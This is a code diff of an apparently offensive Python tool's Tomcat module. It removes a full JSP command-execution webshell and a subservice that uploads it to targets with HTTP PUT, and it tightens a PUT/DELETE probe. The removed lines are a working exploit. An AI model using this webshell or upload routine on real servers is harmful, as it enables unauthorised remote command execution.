@@ -7,54 +7,6 @@ from src.services.serviceclass import BaseServiceClass
 from src.services.servicesubclass import BaseSubServiceClass, VersionSubService
 import requests
 
-cmd_jsp = """
-<%@ page import="java.io.*,java.util.*" %>
-<%
-if (request.getParameter("cmd") != null) {
-    String cmd = request.getParameter("cmd");
-    Process p = Runtime.getRuntime().exec(cmd);
-    InputStream in = p.getInputStream();
-    DataInputStream dis = new DataInputStream(in);
-    String disr = dis.readLine();
-    while ( disr != null ) {
-        out.println(disr);
-        disr = dis.readLine();
-    }
-}
-%>
-<form method="get">
-<input type="text" name="cmd" size="50">
-<input type="submit" value="Execute">
-</form>
-"""
-
-class TomcatPutExploitSubServiceClass(BaseSubServiceClass):
-    def __init__(self) -> None:
-        super().__init__("putexploit", "Bruteforce")
-
-    @error_handler([])
-    def nv(self, hosts, **kwargs) -> None:
-        super().nv(hosts, kwargs=kwargs)
-        
-        results = get_default_context_execution2(f"Tomcat Put Exploit", self.threads, hosts, self.single, timeout=self.timeout, errors=self.errors, verbose=self.verbose)
-
-        if results:
-            self.print_output("Apache Tomcat PUT exploit webshell paths:")
-            for r in results:
-                self.print_output(f"    {r}") # type: ignore
-
-    @error_handler(["host"])
-    def single(self, host, **kwargs):
-        timeout=kwargs.get("timeout", 10)
-        errors=kwargs.get("errors", False)
-        verbose = kwargs.get("verbose", False)
-
-        s = generate_random_string()
-        resp = requests.put(f"http://{host}/{s}", verify=False, data=cmd_jsp)
-        print(resp.text)
-
-        return f"http://{host}/{s}.jsp?cmd=whoami"
-
 class TomcatPuttestSubServiceClass(BaseSubServiceClass):
     def __init__(self) -> None:
         super().__init__("puttest", "Bruteforce")
@@ -78,9 +30,11 @@ class TomcatPuttestSubServiceClass(BaseSubServiceClass):
 
         s = generate_random_string()
         resp = requests.put(f"http://{host}/{s}", verify=False)
-        print(resp.status_code)
+        if not resp.status_code in range(200, 400):
+            return
         resp = requests.delete(f"http://{host}/{s}", verify=False)
-        print(resp.status_code)
+        if not resp.status_code in range(200, 400):
+            return
         return host
 
 class TomcatBruteforceSubServiceClass(BaseSubServiceClass):
@@ -207,4 +161,3 @@ class TomcatServiceClass(BaseServiceClass):
         self.register_subservice(TomcatBruteforceSubServiceClass())
         self.register_subservice(TomcatShutdownSubServiceClass())
         self.register_subservice(TomcatPuttestSubServiceClass())
-        self.register_subservice(TomcatPutExploitSubServiceClass())
